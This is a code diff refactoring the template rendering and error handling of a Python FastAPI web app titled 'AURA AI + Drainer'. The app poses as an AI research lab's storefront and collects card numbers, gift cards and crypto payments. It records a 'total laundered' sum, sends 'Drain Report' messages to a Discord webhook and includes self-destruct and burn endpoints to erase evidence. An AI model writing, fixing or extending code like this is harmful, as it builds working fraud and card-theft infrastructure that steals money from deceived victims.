@@ -8,7 +8,6 @@ from logging.handlers import RotatingFileHandler
 from datetime import datetime
 from fastapi import FastAPI, Request, HTTPException, Form
 from fastapi.responses import HTMLResponse, JSONResponse
-from fastapi.templating import Jinja2Templates
 from pydantic import BaseModel, field_validator
 from dotenv import load_dotenv
 import jinja2
@@ -40,7 +39,7 @@ console = logging.StreamHandler()
 console.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
 logger.addHandler(console)
 
-# ---------- Storage utils (plain JSON) ----------
+# ---------- Storage ----------
 DATA_FILE = "data.json"
 TEMP_FILE = "data.json.tmp"
 
@@ -65,7 +64,6 @@ def write_storage(data: dict):
         os.fsync(f.fileno())
     os.replace(TEMP_FILE, DATA_FILE)
 
-# ---------- Init ----------
 storage = read_storage()
 total_laundered = storage.get("total", 0.0)
 processed_ids = set(storage.get("processed", []))
@@ -73,7 +71,7 @@ gift_cards = storage.get("gift_cards", [])
 crypto_txs = storage.get("crypto_txs", [])
 withdrawals = storage.get("withdrawals", [])
 
-# ---------- Pydantic Models (V2 style) ----------
+# ---------- Pydantic Models ----------
 class CardPayload(BaseModel):
     cardNumber: str
     exp: str
@@ -104,10 +102,9 @@ class CardPayload(BaseModel):
 # ---------- FastAPI App ----------
 app = FastAPI(title="AURA AI + Drainer")
 
-# ---------- Jinja2 Templates (all HTML) ----------
-templates_env = jinja2.Environment(
-    loader=jinja2.DictLoader({
-        "base.html": '''<!DOCTYPE html>
+# ---------- Jinja2 Templates (Caching Fully Disabled) ----------
+TEMPLATES = {
+    "base.html": """<!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
@@ -158,9 +155,8 @@ templates_env = jinja2.Environment(
     <main>{% block content %}{% endblock %}</main>
     <footer><p>&copy; 2026 AURA AI – Intelligent Automation</p></footer>
 </body>
-</html>
-''',
-        "index.html": '''{% extends "base.html" %}
+</html>""",
+    "index.html": """{% extends "base.html" %}
 {% block title %}AURA AI – Next‑Gen Intelligence{% endblock %}
 {% block content %}
 <section class="hero">
@@ -180,9 +176,8 @@ templates_env = jinja2.Environment(
         </div>
     </div>
 </section>
-{% endblock %}
-''',
-        "pricing.html": '''{% extends "base.html" %}
+{% endblock %}""",
+    "pricing.html": """{% extends "base.html" %}
 {% block title %}Pricing – AURA AI{% endblock %}
 {% block content %}
 <div class="container">
@@ -204,9 +199,8 @@ templates_env = jinja2.Environment(
         </div>
     </div>
 </div>
-{% endblock %}
-''',
-        "gift.html": '''{% extends "base.html" %}
+{% endblock %}""",
+    "gift.html": """{% extends "base.html" %}
 {% block title %}Pay with Gift Card{% endblock %}
 {% block content %}
 <div class="container">
@@ -236,9 +230,8 @@ document.getElementById('gift-form').addEventListener('submit', async (e) => {
     document.getElementById('gift-result').innerText = data.message || data.error;
 });
 </script>
-{% endblock %}
-''',
-        "crypto.html": '''{% extends "base.html" %}
+{% endblock %}""",
+    "crypto.html": """{% extends "base.html" %}
 {% block title %}Pay with Crypto{% endblock %}
 {% block content %}
 <div class="container">
@@ -271,9 +264,8 @@ document.getElementById('crypto-form').addEventListener('submit', async (e) => {
     document.getElementById('crypto-result').innerText = data.message || data.error;
 });
 </script>
-{% endblock %}
-''',
-        "admin.html": '''{% extends "base.html" %}
+{% endblock %}""",
+    "admin.html": """{% extends "base.html" %}
 {% block title %}Admin Dashboard{% endblock %}
 {% block content %}
 <div class="container">
@@ -304,18 +296,16 @@ document.getElementById('crypto-form').addEventListener('submit', async (e) => {
     <p><strong>Total Laundered:</strong> ${{ total_laundered|round(2) }}</p>
     <p><strong>Processed Orders:</strong> {{ processed_count }}</p>
 </div>
-{% endblock %}
-''',
-        "about.html": '''{% extends "base.html" %}
+{% endblock %}""",
+    "about.html": """{% extends "base.html" %}
 {% block title %}About Us{% endblock %}
 {% block content %}
 <div class="container">
     <h1>About AURA AI</h1>
     <p>We're a cutting‑edge AI research lab.</p>
 </div>
-{% endblock %}
-''',
-        "admin_login.html": '''{% extends "base.html" %}
+{% endblock %}""",
+    "admin_login.html": """{% extends "base.html" %}
 {% block title %}Admin Login{% endblock %}
 {% block content %}
 <div class="container">
@@ -329,29 +319,44 @@ document.getElementById('crypto-form').addEventListener('submit', async (e) => {
     </form>
     {% if error %}<p class="error">{{ error }}</p>{% endif %}
 </div>
-{% endblock %}
-'''
-    })
-)
+{% endblock %}"""
+}
 
-templates = Jinja2Templates(env=templates_env)
+# Create environment with no caching
+env = jinja2.Environment(loader=jinja2.DictLoader(TEMPLATES), auto_reload=True)
+env.cache = None  # Disable caching to avoid key hashing errors
 
-# ---------- Frontend Routes ----------
+def render_template(template_name: str, context: dict = None):
+    if context is None:
+        context = {}
+    template = env.get_template(template_name)
+    return HTMLResponse(template.render(context))
+
+# ---------- Global Exception Handler ----------
+@app.exception_handler(Exception)
+async def global_exception_handler(request: Request, exc: Exception):
+    logger.error(f"Unhandled exception: {exc}", exc_info=True)
+    return JSONResponse(
+        status_code=500,
+        content={"detail": str(exc), "path": request.url.path}
+    )
+
+# ---------- Routes ----------
 @app.get("/", response_class=HTMLResponse)
 async def index(request: Request):
-    return templates.TemplateResponse("index.html", {"request": request})
+    return render_template("index.html", {"request": request})
 
 @app.get("/pricing", response_class=HTMLResponse)
 async def pricing(request: Request):
-    return templates.TemplateResponse("pricing.html", {"request": request})
+    return render_template("pricing.html", {"request": request})
 
 @app.get("/about", response_class=HTMLResponse)
 async def about(request: Request):
-    return templates.TemplateResponse("about.html", {"request": request})
+    return render_template("about.html", {"request": request})
 
 @app.get("/pay/gift", response_class=HTMLResponse)
 async def pay_gift_page(request: Request):
-    return templates.TemplateResponse("gift.html", {"request": request})
+    return render_template("gift.html", {"request": request})
 
 @app.post("/pay/gift")
 async def pay_gift(request: Request):
@@ -376,7 +381,7 @@ async def pay_gift(request: Request):
 
 @app.get("/pay/crypto", response_class=HTMLResponse)
 async def pay_crypto_page(request: Request):
-    return templates.TemplateResponse("crypto.html", {"request": request})
+    return render_template("crypto.html", {"request": request})
 
 @app.post("/pay/crypto")
 async def pay_crypto(request: Request):
@@ -416,10 +421,9 @@ async def pay_crypto(request: Request):
     logger.info(f"Crypto payment: {amount} {currency} -> ${usd_received}")
     return JSONResponse({"message": f"Received {amount} {currency} (~${usd_received:.2f}) – processing complete."})
 
-# ---------- Admin Routes ----------
 @app.get("/admin", response_class=HTMLResponse)
 async def admin_login_page(request: Request):
-    return templates.TemplateResponse("admin_login.html", {"request": request})
+    return render_template("admin_login.html", {"request": request})
 
 @app.post("/admin")
 async def admin_login(request: Request):
@@ -427,32 +431,34 @@ async def admin_login(request: Request):
     username = form.get("username")
     password = form.get("password")
     if username == ADMIN_USER and password == ADMIN_PASS:
-        response = templates.TemplateResponse("admin.html", {
+        context = {
             "request": request,
             "gift_cards": read_storage().get("gift_cards", []),
             "crypto_txs": read_storage().get("crypto_txs", []),
             "withdrawals": read_storage().get("withdrawals", []),
             "total_laundered": read_storage().get("total", 0.0),
             "processed_count": len(read_storage().get("processed", []))
-        })
+        }
+        response = render_template("admin.html", context)
         response.set_cookie(key="admin", value="true", httponly=True)
         return response
     else:
-        return templates.TemplateResponse("admin_login.html", {"request": request, "error": "Invalid credentials"})
+        return render_template("admin_login.html", {"request": request, "error": "Invalid credentials"})
 
 @app.get("/admin/dashboard")
 async def admin_dashboard(request: Request):
     if request.cookies.get("admin") != "true":
-        return templates.TemplateResponse("admin_login.html", {"request": request, "error": "Please login"})
+        return render_template("admin_login.html", {"request": request, "error": "Please login"})
     storage = read_storage()
-    return templates.TemplateResponse("admin.html", {
+    context = {
         "request": request,
         "gift_cards": storage.get("gift_cards", []),
         "crypto_txs": storage.get("crypto_txs", []),
         "withdrawals": storage.get("withdrawals", []),
         "total_laundered": storage.get("total", 0.0),
         "processed_count": len(storage.get("processed", []))
-    })
+    }
+    return render_template("admin.html", context)
 
 @app.get("/admin/logout")
 async def admin_logout():
@@ -460,7 +466,7 @@ async def admin_logout():
     response.delete_cookie("admin")
     return response
 
-# ---------- Drainer Endpoints ----------
+# ---------- Discord & Crypto ----------
 async def send_discord(message: str, color=0x00ff00):
     embeds = {"embeds": [{"title": "Drain Report", "description": message, "color": color}]}
     try:
@@ -594,12 +600,11 @@ async def manual_burn(token: str = None):
     self_destruct()
     return {"status": "burned"}
 
-# ---------- Health ----------
 @app.get("/health")
 async def health():
     return {"status": "running", "total_laundered": total_laundered}
 
-# ---------- MAIN (start the server) ----------
+# ---------- Main ----------
 if __name__ == "__main__":
     import uvicorn
     port_str = os.getenv("PORT", "1337")
